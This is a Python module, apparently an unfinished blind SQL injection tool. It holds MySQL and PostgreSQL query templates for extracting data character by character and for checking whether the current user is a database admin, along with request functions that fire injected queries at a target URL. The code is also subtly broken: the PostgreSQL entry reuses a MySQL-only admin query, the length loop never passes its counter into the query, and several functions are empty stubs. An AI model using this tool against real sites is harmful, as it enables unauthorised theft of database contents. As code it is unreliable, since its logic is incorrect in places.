from typing import Any
import requests
import sys
from collections.abc import Callable
QUERIES = {
    "MYSQL": {
        'DB_VERSION': "select version()",
        'STR_EXFIL': lambda sub_query,position, mid: F"ascii(substring(({sub_query}),{position},1))>{mid}", 
        'LENGTH_EXFIL': lambda sub_query,i: F"select length(({sub_query}))={i}",
        'COUNT_EXFIL': lambda sub_query,i: F"SELECT ({sub_query})={i}",
        'CURRENT_USER_IS_DB_ADMIN' : lambda username:  F"SELECT(SELECT COUNT(*) FROM mysql.user WHERE Super_priv ='Y' AND current_user='{username}')>1"
    },
    "POSTGRESQL": {
        'DB_VERSION': "select version()",
        'STR_EXFIL': lambda sub_query,position, mid: F"ascii(substring(({sub_query}),{position},1))>{mid}", 
        'LENGTH_EXFIL': lambda sub_query,i: F"select length(({sub_query}))={i}",
        'COUNT_EXFIL': lambda sub_query,i: F"SELECT ({sub_query})={i}",
        'CURRENT_USER_IS_DB_ADMIN' : lambda username:  F"SELECT(SELECT COUNT(*) FROM mysql.user WHERE Super_priv ='Y' AND current_user='{username}')>1"
    }
}

def blind_query(
    req:Callable[[requests.models.Response],str], 
    sqli_truth_condition:Callable[[requests.models.Response], bool],
    url:str,
    base_query:Callable[[str],str],
    sub_query:str, ordinal:str="",
    query_encoder:Callable[[str], str]=None,
    comment:str = "%23",
    debug:bool=False
    ):
    target = query_encoder(base_query(url, sub_query, comment)) if query_encoder else base_query(url, sub_query, comment)
    try:
        with req(target) as res: 
            if debug == True:
                print(F"target: {target}")
                print(F"response headers: {res.headers}")
                print(F"response: {res.content}")
            if (sqli_truth_condition(res)):
                return ordinal if ordinal else True
            return False
    except Exception as e:
        print(F"{e}")
        return False
def question(
    req:Callable[[requests.models.Response],str],
    sqli_truth_condition:Callable[[requests.models.Response], bool],
    url:str,
    base_query:Callable[[str],str],
    sub_query: str, 
    query_encoder:Callable[[str], str]=None,
    comment:str="",
    debug:bool=False):
    return blind_query(req=req, sqli_truth_condition=sqli_truth_condition, url=url, base_query=base_query, sub_query=sub_query, query_encoder=query_encoder,comment=comment, debug=debug)

def get_length(
    req:Callable[[requests.models.Response],str],
    sqli_truth_condition:Callable[[requests.models.Response], bool],
    url:str,
    base_query:Callable[[str],str],
    sub_query: str, # WE PASS QUERIES WITH THE APPROPRIATE DB TYPE HERE
    lower_bound: int = 1,
    upper_bound: int = 65,
    query_encoder:Callable[[str], str]=None,
    comment:str = "",
    debug:bool=False
    ):
    for i in range(lower_bound, upper_bound):
        if(question(req=req, sqli_truth_condition=sqli_truth_condition,url=url, base_query=base_query, sub_query=sub_query, query_encoder=query_encoder, comment=comment, debug=debug)):
            return i


def get_count(url:str, base_query:Callable[[str],str], sub_query: str, sqli_truth_condition:Callable[[requests.models.Response], bool], lower_bound: int = 0, upper_bound: int = 1000, query_encoder:Callable[[str], str]=None, comment:str = "", debug:bool=False):
    pass
def binary_search(url:str, base_query:Callable[[str],str], sub_query: str, sqli_truth_condition:Callable[[requests.models.Response], bool], lo:int, hi:int, position:str, query_encoder:Callable[[str], str]=None, comment:str = "", debug:bool=False):
    pass
def get_string(url:str, base_query:Callable[[str],str], sub_query: str, sqli_truth_condition:Callable[[requests.models.Response], bool], strlen:int, query_encoder:Callable[[str], str]=None, comment:str = "", debug:bool=False):
    pass
def report(url:str, base_query:Callable[[str],str], sub_query: str, sqli_truth_condition:Callable[[requests.models.Response], bool], query_encoder:Callable[[str], str]=None, comment:str = "", debug:bool=False):
    pass